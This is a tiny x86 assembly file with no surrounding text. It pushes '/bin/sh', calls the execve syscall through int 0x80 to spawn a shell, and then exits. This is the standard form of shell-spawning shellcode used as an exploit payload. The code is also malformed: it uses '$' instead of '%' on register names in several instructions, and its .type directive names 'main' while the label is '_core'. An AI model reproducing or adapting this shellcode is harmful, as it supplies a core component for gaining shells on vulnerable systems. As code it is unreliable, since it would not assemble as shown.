	.section	.rodata
.LC0:
	.string "/bin/sh"
	.text
.globl _core
	.type   main,@function
_core:
	movl	$0x0,%edx
	pushl	$0x0
	pushl	$.LC0
	movl	$esp,$ecx
	movl	$.LC0,$ebx
	movl	$0xb,$eax
	int		$0x80
	
	movl	$0x0,$ebx
	movl	$0x1,$eax
	int 	$0x80
